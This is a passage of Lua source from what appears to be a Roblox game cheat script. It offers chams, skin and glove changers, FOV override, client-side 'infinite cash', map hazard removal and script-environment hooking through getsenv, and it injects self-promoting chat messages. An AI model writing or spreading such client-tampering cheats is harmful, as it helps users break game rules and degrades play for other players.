			RGlove.Mesh.TextureId = Gloves[values.skins.glove.model.Dropdown][values.skins.glove.model.Scroll[values.skins.glove.model.Dropdown]].Textures.TextureId
			RGlove.Parent = RArm
			RGlove.Transparency = 0
			RGlove.Welded.Part0 = RArm
		end
		if RGlove.Transparency == 1 then
			RGlove:Destroy()
			RGlove = nil
		else
			local GloveTexture = C.INST("StringValue")
			GloveTexture.Value = RGlove.Mesh.TextureId
			GloveTexture.Name = "StringValue"
			GloveTexture.Parent = RGlove

			if values.visuals.effects["accessory chams"].Toggle then
				UpdateAccessory(RGlove)
			end
		end
		RSleeve = RArm:FindFirstChild("Sleeve")
		if RSleeve ~= nil then
			if values.skins.Misc["Remove sleeves"].Toggle then
			pcall(function()
			RSleeve.Transparency = 1 
			end)
			end
			local SleeveTexture = C.INST("StringValue")
			SleeveTexture.Value = RSleeve.Mesh.TextureId
			SleeveTexture.Name = "StringValue"
			SleeveTexture.Parent = RSleeve
			if values.visuals.effects["arm chams"].Toggle then
				LArm.Color = values.visuals.effects["arm chams"].Color
			end
			if values.visuals.effects["accessory chams"].Toggle then
				UpdateAccessory(RSleeve)
			end
		end
	end
	if LArm then
		local OriginalColor = C.INST("Color3Value")
		OriginalColor.Value = LArm.Color
		OriginalColor.Name = "Color3Value"
		OriginalColor.Parent = LArm
		if values.visuals.effects["arm chams"].Toggle then
			LArm.Color = values.visuals.effects["arm chams"].Color
			LArm.Transparency = values.visuals.effects["arm chams"].Transparency
		end
		LGlove = LArm:FindFirstChild("Glove") or LArm:FindFirstChild("LGlove")
				if values.skins.glove['glove changer'].Toggle and Client.gun ~= 'none' then
			if LGlove then LGlove:Destroy() end
			LGlove = GloveModels[values.skins.glove.model.Dropdown].LGlove:Clone()
			LGlove.Mesh.TextureId = Gloves[values.skins.glove.model.Dropdown][values.skins.glove.model.Scroll[values.skins.glove.model.Dropdown]].Textures.TextureId
			LGlove.Transparency = 0
			LGlove.Parent = LArm
			end
		if LGlove.Transparency == 1 then
			LGlove:Destroy()
			LGlove =  nil
		else
			local GloveTexture = C.INST("StringValue")
			GloveTexture.Value = LGlove.Mesh.TextureId
			GloveTexture.Name = "StringValue"
			GloveTexture.Parent = LGlove

			if values.visuals.effects["accessory chams"].Toggle then
				UpdateAccessory(LGlove)
			end
		end
		LSleeve = LArm:FindFirstChild("Sleeve")
		if LSleeve ~= nil then
					if values.skins.Misc["Remove sleeves"].Toggle then
			pcall(function()
			LSleeve.Transparency = 1
			end)
			end
			local SleeveTexture = C.INST("StringValue")
			SleeveTexture.Value = LSleeve.Mesh.TextureId
			SleeveTexture.Name = "StringValue"
			SleeveTexture.Parent = LSleeve

			if values.visuals.effects["accessory chams"].Toggle then
				UpdateAccessory(LSleeve)
			end
		end
	end
end)
Camera.ChildAdded:Connect(function(obj)
	if obj.Name == "Arms" then
		RArm, LArm, RGlove, RSleeve, LGlove, LSleeve = nil, nil, nil, nil, nil, nil
		WeaponObj = {}
	end
end) 
Camera:GetPropertyChangedSignal("FieldOfView"):Connect(function(fov) 
	if LocalPlayer.Character == nil then return end 
	if fov == values.visuals.self["fov changer"].Slider then return end 
	if values.visuals.self["on scope"].Toggle or not LocalPlayer.Character:FindFirstChild("AIMING") then 
		Camera.FieldOfView = values.visuals.self["fov changer"].Slider 
	end 
end) 
LocalPlayer.Cash:GetPropertyChangedSignal("Value"):Connect(function(cash) 
	if values.misc.client["infinite cash"].Toggle and cash ~= 90000000 then 
		LocalPlayer.Cash.Value = 9000000 
	end 
end) 
if workspace:FindFirstChild("Map") and workspace:FindFirstChild("Map"):FindFirstChild("Origin") then 
	if workspace.Map.Origin.Value == "de_cache" or workspace.Map.Origin.Value == "de_vertigo" or workspace.Map.Origin.Value == "de_nuke" or workspace.Map.Origin.Value == "de_aztec" then 
		oldSkybox = Lighting:FindFirstChildOfClass("Sky"):Clone() 
	end 
end 
workspace.ChildAdded:Connect(function(obj) 
	if obj.Name == "Map" then 
		wait(5) 
		if values.misc.client["remove killers"].Toggle then 
			if workspace:FindFirstChild("Map") and workspace:FindFirstChild("Map"):FindFirstChild("Killers") then 
				local clone = workspace:FindFirstChild("Map"):FindFirstChild("Killers"):Clone() 
				clone.Name = "KillersClone" 
				clone.Parent = workspace:FindFirstChild("Map") 

				workspace:FindFirstChild("Map"):FindFirstChild("Killers"):Destroy() 
			end 
		end 
		if oldSkybox ~= nil then 
			oldSkybox:Destroy() 
			oldSkybox = nil 
		end 
		local Origin = workspace.Map:WaitForChild("Origin") 
		if workspace.Map.Origin.Value == "de_cache" or workspace.Map.Origin.Value == "de_vertigo" or workspace.Map.Origin.Value == "de_nuke" or workspace.Map.Origin.Value == "de_aztec" then 
			oldSkybox = Lighting:FindFirstChildOfClass("Sky"):Clone() 

			local sky = values.visuals.world.skybox.Dropdown 
			if sky ~= "none" then 
				Lighting:FindFirstChildOfClass("Sky"):Destroy() 
				local skybox = C.INST("Sky") 
				skybox.SkyboxLf = Skyboxes[sky].SkyboxLf 
				skybox.SkyboxBk = Skyboxes[sky].SkyboxBk 
				skybox.SkyboxDn = Skyboxes[sky].SkyboxDn 
				skybox.SkyboxFt = Skyboxes[sky].SkyboxFt 
				skybox.SkyboxRt = Skyboxes[sky].SkyboxRt 
				skybox.SkyboxUp = Skyboxes[sky].SkyboxUp 
				skybox.Name = "override" 
				skybox.Parent = Lighting 
			end 
		else 
			local sky = values.visuals.world.skybox.Dropdown 
			if sky ~= "none" then 
				local skybox = C.INST("Sky") 
				skybox.SkyboxLf = Skyboxes[sky].SkyboxLf 
				skybox.SkyboxBk = Skyboxes[sky].SkyboxBk 
				skybox.SkyboxDn = Skyboxes[sky].SkyboxDn 
				skybox.SkyboxFt = Skyboxes[sky].SkyboxFt 
				skybox.SkyboxRt = Skyboxes[sky].SkyboxRt 
				skybox.SkyboxUp = Skyboxes[sky].SkyboxUp 
				skybox.Name = "override" 
				skybox.Parent = Lighting 
			end 
		end 
	end 
end) 
Lighting.ChildAdded:Connect(function(obj) 
	if obj:IsA("Sky") and obj.Name ~= "override" then 
		oldSkybox = obj:Clone() 
	end 
end) 

local function CollisionTBL(obj) 
	if obj:IsA("Accessory") then 
		C.INSERT(Collision, obj) 
	end 
	if obj:IsA("Part") then 
		if obj.Name == "HeadHB" or obj.Name == "FakeHead" then 
			C.INSERT(Collision, obj) 
		end 
	end 
end 

LocalPlayer.CharacterAdded:Connect(function(char) 
	repeat RunService.RenderStepped:Wait() 
	until char:FindFirstChild("Gun") 
	SelfObj = {} 
	if values.skins.characters["character changer"].Toggle then 
		ChangeCharacter(ChrModels:FindFirstChild(values.skins.characters.skin.Scroll)) 
	end 
	if char:FindFirstChildOfClass("Shirt") then 
		local String = C.INST("StringValue") 
		String.Name = "OriginalTexture" 
		String.Value = char:FindFirstChildOfClass("Shirt").ShirtTemplate 
		String.Parent = char:FindFirstChildOfClass("Shirt") 

		if C.TBLFIND(values.visuals.effects.removals.Jumbobox, "clothes") then 
			char:FindFirstChildOfClass("Shirt").ShirtTemplate = "" 
		end 
	end 
	if char:FindFirstChildOfClass("Pants") then 
		local String = C.INST("StringValue") 
		String.Name = "OriginalTexture" 
		String.Value = char:FindFirstChildOfClass("Pants").PantsTemplate 
		String.Parent = char:FindFirstChildOfClass("Pants") 

		if C.TBLFIND(values.visuals.effects.removals.Jumbobox, "clothes") then 
			char:FindFirstChildOfClass("Pants").PantsTemplate = "" 
		end 
	end 
	for i,v in pairs(char:GetChildren()) do 
		if v:IsA("BasePart") and v.Transparency ~= 1 then 
			C.INSERT(SelfObj, v) 
			local Color = C.INST("Color3Value") 
			Color.Name = "OriginalColor" 
			Color.Value = v.Color 
			Color.Parent = v 

			local String = C.INST("StringValue") 
			String.Name = "OriginalMaterial" 
			String.Value = v.Material.Name 
			String.Parent = v 
		elseif v:IsA("Accessory") and v.Handle.Transparency ~= 1 then 
			C.INSERT(SelfObj, v.Handle) 
			local Color = C.INST("Color3Value") 
			Color.Name = "OriginalColor" 
			Color.Value = v.Handle.Color 
			Color.Parent = v.Handle 

			local String = C.INST("StringValue") 
			String.Name = "OriginalMaterial" 
			String.Value = v.Handle.Material.Name 
			String.Parent = v.Handle 
		end 
	end 
	if values.visuals.self["self chams"].Toggle then 
		for _,obj in pairs(SelfObj) do 
			if obj.Parent ~= nil then 
				obj.Material = values.visuals.self["self chams material"].Dropdown 
				obj.Color = values.visuals.self["self chams"].Color 
			end 
		end 
	end 
	LocalPlayer.Character.ChildAdded:Connect(function(Child) 
		if Child:IsA("Accessory") and Child.Handle.Transparency ~= 1 then 
			C.INSERT(SelfObj, Child.Handle) 
			local Color = C.INST("Color3Value") 
			Color.Name = "OriginalColor" 
			Color.Value = Child.Handle.Color 
			Color.Parent = Child.Handle 

			local String = C.INST("StringValue") 
			String.Name = "OriginalMaterial" 
			String.Value = Child.Handle.Material.Name 
			String.Parent = Child.Handle 

			if values.visuals.self["self chams"].Toggle then 
				for _,obj in pairs(SelfObj) do 
					if obj.Parent ~= nil then 
						obj.Material = values.visuals.self["self chams material"].Dropdown 
						obj.Color = values.visuals.self["self chams"].Color 
					end 
				end 
			end 
		end 
	end) 

	if values.misc.animations.enabled.Toggle and values.misc.animations.enabled.Active then 
		LoadedAnim = LocalPlayer.Character.Humanoid:LoadAnimation(Dance) 
		LoadedAnim.Priority = Enum.AnimationPriority.Action 
		LoadedAnim:Play() 
	end 
end) 
if LocalPlayer.Character ~= nil then 
	for i,v in pairs(LocalPlayer.Character:GetChildren()) do 
		if v:IsA("BasePart") and v.Transparency ~= 1 then 
			C.INSERT(SelfObj, v) 
			local Color = C.INST("Color3Value") 
			Color.Name = "OriginalColor" 
			Color.Value = v.Color 
			Color.Parent = v 

			local String = C.INST("StringValue") 
			String.Name = "OriginalMaterial" 
			String.Value = v.Material.Name 
			String.Parent = v 
		elseif v:IsA("Accessory") and v.Handle.Transparency ~= 1 then 
			C.INSERT(SelfObj, v.Handle) 
			local Color = C.INST("Color3Value") 
			Color.Name = "OriginalColor" 
			Color.Value = v.Handle.Color 
			Color.Parent = v.Handle 

			local String = C.INST("StringValue") 
			String.Name = "OriginalMaterial" 
			String.Value = v.Handle.Material.Name 
			String.Parent = v.Handle 
		end 
	end 
	if values.visuals.self["self chams"].Toggle then 
		for _,obj in pairs(SelfObj) do 
			if obj.Parent ~= nil then 
				obj.Material = values.visuals.self["self chams material"].Dropdown 
				obj.Color = values.visuals.self["self chams"].Color 
			end 
		end 
	end 
	LocalPlayer.Character.ChildAdded:Connect(function(Child) 
		if Child:IsA("Accessory") and Child.Handle.Transparency ~= 1 then 
			C.INSERT(SelfObj, Child.Handle) 
			local Color = C.INST("Color3Value") 
			Color.Name = "OriginalColor" 
			Color.Value = Child.Handle.Color 
			Color.Parent = Child.Handle 

			local String = C.INST("StringValue") 
			String.Name = "OriginalMaterial" 
			String.Value = Child.Handle.Material.Name 
			String.Parent = Child.Handle 

			if values.visuals.self["self chams"].Toggle then 
				for _,obj in pairs(SelfObj) do 
					if obj.Parent ~= nil then 
						obj.Material = values.visuals.self["self chams material"].Dropdown
						obj.Color = values.visuals.self["self chams"].Color 
					end 
				end 
			end 
		end 
	end) 
end 
Players.PlayerAdded:Connect(function(Player)
	Player:GetPropertyChangedSignal("Team"):Connect(function(new)
		wait()
		if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then

		end
	end)
    Player.CharacterAdded:Connect(function(Character)
        Character.ChildAdded:Connect(function(obj)
            wait(1)
			CollisionTBL(obj)
        end)
		wait(1)
		if Character ~= nil then
			local Value = C.INST('Vector3Value')
			Value.Name = 'OldPosition'
			Value.Value = Character.HumanoidRootPart.Position
			Value.Parent = Character.HumanoidRootPart
			for _,obj in pairs(Character:GetChildren()) do
				if obj:IsA('BasePart') and Player ~= LocalPlayer and obj.Name ~= 'HumanoidRootPart' and obj.Name ~= 'Head' and obj.Name ~= 'BackC4' and obj.Name ~= 'HeadHB' then

				end
			end
		end
	end)
end)

for _,Player in pairs(Players:GetPlayers()) do
	if Player ~= LocalPlayer then
		Player:GetPropertyChangedSignal("Team"):Connect(function(new)
			wait()
			if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then

			end
		end)
	else
		LocalPlayer:GetPropertyChangedSignal("Team"):Connect(function(new)
			wait()
			for _,Player in pairs(Players:GetPlayers()) do
				if Player.Character then

				end
			end
		end)
	end
	Player.CharacterAdded:Connect(function(Character)
        Character.ChildAdded:Connect(function(obj)
            wait(1)
			CollisionTBL(obj)
        end)
		wait(1)
		if Player.Character ~= nil and Player.Character:FindFirstChild("HumanoidRootPart") then
			local Value = C.INST('Vector3Value')
			Value.Value = Player.Character.HumanoidRootPart.Position
			Value.Name = 'OldPosition'
			Value.Parent = Player.Character.HumanoidRootPart
			for _,obj in pairs(Player.Character:GetChildren()) do

			end
		end
    end)
	if Player.Character ~= nil and Player.Character:FindFirstChild("UpperTorso") then
			local Value = C.INST('Vector3Value')
			Value.Value = Player.Character.HumanoidRootPart.Position
			Value.Name = 'OldPosition'
			Value.Parent = Player.Character.HumanoidRootPart
		for _,obj in pairs(Player.Character:GetChildren()) do
			CollisionTBL(obj)

		end
	end
end

Players.PlayerAdded:Connect(function(Player)
	Player:GetPropertyChangedSignal("Team"):Connect(function(new)
		wait()
		if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
			for _2,Obj in pairs(Player.Character:GetDescendants()) do

			end
		end
	end)
    Player.CharacterAdded:Connect(function(Character)
        Character.ChildAdded:Connect(function(obj)
            wait(1)
			CollisionTBL(obj)
        end)
		wait(1)
		if Character ~= nil then
			local Value = C.INST('Vector3Value')
			Value.Value = Player.Character.HumanoidRootPart.Position
			Value.Name = 'OldPosition'
			Value.Parent = Player.Character.HumanoidRootPart
		end
    end)
end)
for _,Player in pairs(Players:GetPlayers()) do
	if Player ~= LocalPlayer then
		Player:GetPropertyChangedSignal("Team"):Connect(function(new)
			wait()
			if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then

			end
		end)
	else
		LocalPlayer:GetPropertyChangedSignal("Team"):Connect(function(new)
			wait()
			for _,Player in pairs(Players:GetPlayers()) do
				if Player.Character then

				end
			end
		end)
	end
	Player.CharacterAdded:Connect(function(Character)
        Character.ChildAdded:Connect(function(obj)
            wait(1)
			CollisionTBL(obj)
        end)
		wait(1)
		if Player.Character ~= nil and Player.Character:FindFirstChild("HumanoidRootPart") then
			local Value = C.INST('Vector3Value')
			Value.Value = Player.Character.HumanoidRootPart.Position
			Value.Name = 'OldPosition'
			Value.Parent = Player.Character.HumanoidRootPart

		end
    end)
	if Player.Character ~= nil and Player.Character:FindFirstChild("UpperTorso") then
		local Value = C.INST("Vector3Value")
		Value.Name = "OldPosition"
		Value.Value = Player.Character.HumanoidRootPart.Position
		Value.Parent = Player.Character.HumanoidRootPart
		for _,obj in pairs(Player.Character:GetChildren()) do
			CollisionTBL(obj)
			if obj:IsA("BasePart") and Player ~= LocalPlayer and obj.Name ~= "HumanoidRootPart" and obj.Name ~= "Head" and obj.Name ~= "BackC4" and obj.Name ~= "HeadHB" then


			end
		end
	end
end



wait()

local senv = getsenv(game.Players.LocalPlayer.PlayerGui.Client)
senv.splatterBlood = function() end
		ChatScript.createNewMessage("SamuelPaste","SamuelPaste winning $$$",MainUIColor,C.COL3(1,1,1),0.01,nil)
		ChatScript.moveOldMessages()
		ChatScript.createNewMessage("SamuelPaste","Thanks cideware, tinp0g and mad for sending me pastes",MainUIColor,C.COL3(1,1,1),0.01,nil)
		print("Hello bucks script user :D")
		

while true do task.wait()
	for i,b in next, watermarklocation.watermark:GetChildren() do 
		if b:IsA('UIGradient') then 
			if b.Name == values.misc.watermark.themes.Dropdown then 
				b.Enabled = true
			else
				b.Enabled = false
			end
		end
	end;

	if ovascreengui['menu'].Image ~= 'rbxassetid://'..themebackground[values.misc.addons['background'].Dropdown] then 
		ovascreengui['menu'].Image = 'rbxassetid://'..themebackground[values.misc.addons['background'].Dropdown]
	end;

	ovascreengui['menu'].ImageColor3 = values.misc.addons['background color'].Color
	ovascreengui['menu'].BackgroundColor3 = C.COL3RGB(1, 1, 1)

	ovascreengui['menu'].ImageTransparency = values.misc.addons['background color'].Transparency


	if values.misc.addons['ui border'].Toggle then 
		ovascreengui['menu'].BorderSizePixel = 1
		ovascreengui['menu'].BorderColor3 = values.misc.addons['ui border'].Color
	else 
		ovascreengui['menu'].BorderSizePixel = 0
	end;
end;